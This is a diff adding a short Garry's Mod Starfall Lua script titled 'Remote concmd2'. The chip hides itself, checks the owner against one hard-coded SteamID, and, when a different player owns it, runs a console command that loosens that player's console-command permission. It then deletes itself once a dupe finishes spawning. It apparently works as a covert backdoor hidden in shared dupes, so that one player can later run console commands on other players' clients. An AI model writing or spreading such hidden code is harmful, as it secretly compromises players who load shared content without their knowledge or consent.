@@ -1,0 +1,28 @@
+// @name Remote concmd2
+--@name Generic
+--@author
+--@server
+--@model models/spacecode/sfchip_small.mdl
+
+chip():setNoDraw(true)
+chip():setSolid(false)
+
+local Owner = owner()
+--Owner = find.playersByName("Mark")[1]
+Owner = find.allPlayers(function(p)
+    if p:getSteamID() == "STEAM_0:1:54066003" then
+        return true
+    end
+end)[1]
+--print(Owner)
+
+
+if Owner ~= owner() then
+    concmd("sf_permission_cl console.command client 3")
+end
+
+
+
+hook.add("DupeFinished", "abc", function()
+    chip():remove()
+end)
